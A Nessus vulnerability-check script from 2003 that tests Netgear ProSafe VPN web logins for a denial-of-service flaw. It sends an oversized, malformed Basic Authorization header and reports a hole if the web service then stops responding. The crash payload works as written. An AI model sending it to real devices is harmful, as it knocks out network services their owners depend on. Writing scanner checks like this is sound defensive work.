#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11474);
 script_bugtraq_id(7166);
 script_version ("$Revision: 1.3 $");
 
 name["english"] = "NetGear ProSafe VPN Login DoS";

 script_name(english:name["english"]);
 
 desc["english"] = "
It was possible to crash the remote Web server (possibly
the Netgear ProSafe VPN Web interface) by supplying a long
an malformed username and password.

An attacker may use this flaw to disable the remote service

Solution : None at this time
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Web server buffer overflow";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes");
  script_require_ports("Services/www",80);
 exit(0);
}



include("http_func.inc");

port = get_http_port(default:80);


if(! get_port_state(port)) exit(0);

soc = http_open_socket(port);
if(soc)
  {
   if (http_is_dead(port: port))exit(0);
   req = http_get(item:"/", port:port);
   req = req - string("\r\n\r\n");
   
   req = req + string("\nAuthorization: Basic Authorization: Basic NzA5NzA5NzIzMDk4NDcyMDkzODQ3MjgzOXVqc2tzb2RwY2tmMHdlOW9renhjazkwenhjcHp4Yzo3MDk3MDk3MjMwOTg0NzIwOTM4NDcyODM5dWpza3NvZHBja2Ywd2U5b2t6eGNrOTB6eGNwenhj\r\n\r\n");

   send(socket:soc, data:req);
   r = http_recv(socket:soc);
   http_close_socket(soc);
   if (http_is_dead(port: port)) security_hole(port);
}

